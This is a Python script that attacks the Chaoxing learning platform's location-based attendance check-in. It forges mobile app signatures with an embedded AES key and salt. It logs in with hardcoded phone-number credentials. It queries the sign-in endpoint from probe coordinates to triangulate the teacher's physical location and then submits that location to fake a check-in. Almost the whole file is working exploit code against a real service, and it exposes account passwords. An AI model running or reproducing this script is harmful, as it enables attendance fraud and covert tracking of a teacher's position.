#!/usr/bin/env python3
"""
三角定位法 - 利用3个已知点的距离反推教师位置
然后验证位置签到伪造
"""
import base64, hashlib, json, uuid, requests, urllib3, time, re, math
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

location_aid = "5000139505593"

# 设为缺勤
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
             data={"uids": puid_s, "status": "0", "remark": ""},
             headers=ajax_hdr, timeout=20)
print(f"设为缺勤: {r.text[:50]}")
time.sleep(2)

def get_distance(lat, lng):
    """获取指定坐标到教师位置的距离"""
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": location_aid, "uid": puid_s, "clientip": "",
                       "latitude": str(lat), "longitude": str(lng),
                       "appType": "15", "fid": "0"},
                 headers=ajax_hdr, timeout=10)
    text = r.text
    if "成功" in text or "已签到" in text:
        return 0, True
    m = re.search(r'(\d+\.?\d*)\s*米', text)
    if m:
        return float(m.group(1)), False
    if "已结束" in text:
        return -2, False
    return -1, False

# ======================================================================
# 三角定位法
# ======================================================================
print("\n" + "=" * 80)
print("[1] 三角定位 - 收集3个以上已知点的距离")
print("=" * 80)

# 使用郑州附近的3个点
probe_points = [
    ("P1", 34.78, 113.66),
    ("P2", 34.78, 113.68),
    ("P3", 34.80, 113.66),
    ("P4", 34.80, 113.68),
    ("P5", 34.79, 113.67),
]

measurements = []
for name, lat, lng in probe_points:
    dist, success = get_distance(lat, lng)
    if success:
        print(f"  {name}({lat},{lng}): 签到成功！")
        # 直接成功，不需要继续
        r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
                     data={"uids": puid_s, "status": "1", "remark": ""},
                     headers=ajax_hdr, timeout=20)
        exit(0)
    elif dist > 0:
        measurements.append((lat, lng, dist))
        print(f"  {name}({lat},{lng}): 距离={dist:.0f}m")
    else:
        print(f"  {name}({lat},{lng}): 异常({dist})")
    time.sleep(0.3)

# 三角定位计算
if len(measurements) >= 3:
    print("\n[2] 三角定位计算...")

    # 使用最小二乘法求解
    # 对于每个测量点: (lat - t_lat)^2 + (lng - t_lng)^2 * cos(lat)^2 = (dist / 111000)^2
    # 简化为2D平面近似

    def haversine_distance(lat1, lon1, lat2, lon2):
        """计算两点间的距离（米）"""
        R = 6371000
        phi1, phi2 = math.radians(lat1), math.radians(lat2)
        dphi = math.radians(lat2 - lat1)
        dlambda = math.radians(lon2 - lon1)
        a = math.sin(dphi/2)**2 + math.cos(phi1)*math.cos(phi2)*math.sin(dlambda/2)**2
        return 2 * R * math.asin(math.sqrt(a))

    # 网格搜索法 - 在测量点围成的区域内搜索
    lats = [m[0] for m in measurements]
    lngs = [m[1] for m in measurements]

    # 搜索范围
    lat_min, lat_max = min(lats) - 0.02, max(lats) + 0.02
    lng_min, lng_max = min(lngs) - 0.02, max(lngs) + 0.02

    best_error = float('inf')
    best_lat, best_lng = 34.79, 113.67

    # 粗搜索
    step = 0.001  # 约111m
    for lat_i in range(int(lat_min / step), int(lat_max / step) + 1):
        for lng_i in range(int(lng_min / step), int(lng_max / step) + 1):
            t_lat = lat_i * step
            t_lng = lng_i * step
            error = 0
            for m_lat, m_lng, m_dist in measurements:
                calc_dist = haversine_distance(m_lat, m_lng, t_lat, t_lng)
                error += (calc_dist - m_dist) ** 2
            if error < best_error:
                best_error = error
                best_lat = t_lat
                best_lng = t_lng

    print(f"  粗搜索结果: ({best_lat:.6f},{best_lng:.6f}), 误差={math.sqrt(best_error/len(measurements)):.0f}m")

    # 精搜索
    step2 = 0.0001  # 约11m
    for lat_i in range(int((best_lat - 0.002) / step2), int((best_lat + 0.002) / step2) + 1):
        for lng_i in range(int((best_lng - 0.002) / step2), int((best_lng + 0.002) / step2) + 1):
            t_lat = lat_i * step2
            t_lng = lng_i * step2
            error = 0
            for m_lat, m_lng, m_dist in measurements:
                calc_dist = haversine_distance(m_lat, m_lng, t_lat, t_lng)
                error += (calc_dist - m_dist) ** 2
            if error < best_error:
                best_error = error
                best_lat = t_lat
                best_lng = t_lng

    print(f"  精搜索结果: ({best_lat:.6f},{best_lng:.6f}), 误差={math.sqrt(best_error/len(measurements)):.0f}m")

    # ======================================================================
    # 验证 - 用计算出的位置尝试签到
    # ======================================================================
    print(f"\n[3] 用计算出的位置尝试签到: ({best_lat:.6f},{best_lng:.6f})")

    # 先测试距离
    dist, success = get_distance(best_lat, best_lng)
    if success:
        print(f"  *** 位置签到伪造成功！***")
    elif dist > 0:
        print(f"  计算位置距离: {dist:.0f}m")

        # 在计算位置周围微调
        for dlat in [-0.0005, 0, 0.0005]:
            for dlng in [-0.0005, 0, 0.0005]:
                test_lat = best_lat + dlat
                test_lng = best_lng + dlng
                dist2, success2 = get_distance(test_lat, test_lng)
                if success2:
                    print(f"  *** 位置签到伪造成功！坐标=({test_lat:.6f},{test_lng:.6f}) ***")
                    break
                elif dist2 >= 0 and dist2 < dist:
                    print(f"  更近: ({test_lat:.6f},{test_lng:.6f}), 距离={dist2:.0f}m")
                    best_lat = test_lat
                    best_lng = test_lng
                    dist = dist2
            else:
                continue
            break
    elif dist == -2:
        print(f"  签到活动已结束，无法继续测试")

# ======================================================================
# 最终状态检查
# ======================================================================
time.sleep(2)
r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": location_aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
final_status = get_status(d)
print(f"\n最终状态: status={final_status}")

# 恢复
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
             data={"uids": puid_s, "status": "1", "remark": ""},
             headers=ajax_hdr, timeout=20)
print(f"恢复: {r.text[:50]}")

print("\n测试完成")
